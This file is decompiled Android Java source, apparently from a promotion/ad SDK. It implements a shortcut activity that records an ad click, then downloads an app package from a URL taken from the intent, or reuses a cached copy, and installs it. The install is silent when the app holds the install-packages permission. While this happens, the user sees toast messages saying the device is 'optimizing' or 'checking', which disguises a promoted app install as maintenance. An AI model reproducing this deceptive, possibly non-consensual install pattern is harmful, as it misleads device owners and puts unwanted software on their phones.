package com.zhuoyi.system.promotion.activity;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.Toast;
import com.zhuoyi.system.download.model.DownloadInfo;
import com.zhuoyi.system.download.util.DownloadUtils;
import com.zhuoyi.system.download.util.DownloadUtils.MyNotifyDownloadHandler;
import com.zhuoyi.system.promotion.util.PromUtils;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.statistics.prom.util.StatsPromUtils;
import com.zhuoyi.system.util.AppInfoUtils;
import com.zhuoyi.system.util.Logger;
import com.zhuoyi.system.util.ResourceIdUtils;
import com.zhuoyi.system.util.model.MyPackageInfo;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;

public class PromCommonShortcutActivity extends Activity {
    private static final String TAG = "PromCommonShortcutActivity";
    private int position = 9;

    class SearchApkFileFromSDCardTask extends AsyncTask<Void, Void, String> {
        String appName;
        String downloadUrl;
        String fileName;
        int iconId;
        String iconUrl;
        String md5;
        String packageName;
        int versionCode;

        public SearchApkFileFromSDCardTask(String packageName, int versionCode, String appName, String fileName, String iconUrl, String downloadUrl, String md5, int iconId) {
            this.packageName = packageName;
            this.versionCode = versionCode;
            this.appName = appName;
            this.fileName = fileName;
            this.iconId = iconId;
            this.iconUrl = iconUrl;
            this.downloadUrl = downloadUrl;
            this.md5 = md5;
        }

        protected String doInBackground(Void... params) {
            String apkPath = DownloadUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).getApkDownloadFilePath(this.packageName, this.versionCode);
            if (!new File(apkPath).exists()) {
                apkPath = null;
            }
            if (apkPath == null) {
                PromUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).getSpecApkPath(this.fileName, this.packageName);
            }
            PromUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).removeCommonShortcutInfo(new MyPackageInfo(this.packageName, this.versionCode));
            return apkPath;
        }

        protected void onPostExecute(String apkPath) {
            if (apkPath == null) {
                int notifyId = DownloadUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).generateDownladNotifyId();
                apkPath = DownloadUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).getApkDownloadFilePath(this.packageName, this.versionCode);
                if (DownloadUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).getDownloadApkThreadMap().containsKey(new MyPackageInfo(this.packageName, this.versionCode))) {
                    Toast.makeText(PromCommonShortcutActivity.this.getApplicationContext(), ResourceIdUtils.getResourceId(PromCommonShortcutActivity.this.getApplicationContext(), "R.string.zy_optimizing"), 0).show();
                    return;
                }
                DownloadUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).addDownloadApkThread(new DownloadInfo(new MyNotifyDownloadHandler(this.appName, apkPath, this.packageName, this.iconUrl, notifyId, ResourceIdUtils.getResourceId(PromCommonShortcutActivity.this.getApplicationContext(), "R.drawable.zy_default_app_icon"), this.iconId, this.versionCode, PromCommonShortcutActivity.this.position, 3, this.downloadUrl, this.md5, null), this.packageName, this.versionCode, PromCommonShortcutActivity.this.position, 3, this.downloadUrl, this.md5, true));
                Toast.makeText(PromCommonShortcutActivity.this.getApplicationContext(), ResourceIdUtils.getResourceId(PromCommonShortcutActivity.this.getApplicationContext(), "R.string.zy_optimize_to_background"), 1).show();
                return;
            }
            PromUtils.getInstance(PromCommonShortcutActivity.this.getApplicationContext()).install(PromCommonShortcutActivity.this.checkCallingOrSelfPermission("android.permission.INSTALL_PACKAGES") == 0, apkPath, new MyPackageInfo(this.packageName, this.versionCode, PromCommonShortcutActivity.this.position, 3));
        }
    }

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Logger.debug(TAG, "PromCommonShortcutActivity is onCreate");
        Intent intent = getIntent();
        if (intent != null) {
            String packageName = intent.getStringExtra(BundleConstants.BUNDLE_PACKAGE_NAME);
            int versionCode = intent.getIntExtra(BundleConstants.BUNDLE_VERSION_CODE, 0);
            int iconId = intent.getIntExtra(BundleConstants.BUNDLE_ICON_ID, 0);
            String appName = intent.getStringExtra(BundleConstants.BUNDLE_APP_NAME);
            String downloadUrl = intent.getStringExtra(BundleConstants.BUNDLE_DOWNLOAD_URL);
            String iconUrl = intent.getStringExtra(BundleConstants.BUNDLE_ICON_URL);
            String md5 = intent.getStringExtra(BundleConstants.BUNDLE_MD5);
            String fileName = intent.getStringExtra(BundleConstants.BUNDLE_FILE_NAME);
            this.position = intent.getIntExtra(BundleConstants.BUNDLE_APP_INFO_POSITION, this.position);
            Logger.debug(TAG, "shortcut packageName = " + packageName);
            StatsPromUtils.getInstance(getApplicationContext()).addAdClickAction(packageName, iconId, this.position, 3);
            if (packageName != null) {
                if (DownloadUtils.getInstance(getApplicationContext()).getAppStatus(packageName, versionCode) == 3) {
                    AppInfoUtils.launchOtherActivity(getApplicationContext(), packageName, null);
                } else {
                    ArrayList<MyPackageInfo> commonShortcutInfoList = PromUtils.getInstance(getApplicationContext()).getCommonShortcutInfoList();
                    boolean exit = false;
                    if (commonShortcutInfoList != null) {
                        Iterator it = commonShortcutInfoList.iterator();
                        while (it.hasNext()) {
                            MyPackageInfo info = (MyPackageInfo) it.next();
                            if (info.getPackageName().equals(packageName) && info.getVersionCode() == versionCode) {
                                Toast.makeText(getApplicationContext(), ResourceIdUtils.getResourceId(getApplicationContext(), "R.string.zy_checking"), 0).show();
                                exit = true;
                                break;
                            }
                        }
                    }
                    if (!exit) {
                        PromUtils.getInstance(getApplicationContext()).addCommonShortcutInfo(new MyPackageInfo(packageName, versionCode));
                        new SearchApkFileFromSDCardTask(packageName, versionCode, appName, fileName, iconUrl, downloadUrl, md5, iconId).execute(new Void[0]);
                    }
                }
            }
        }
        finish();
    }
}
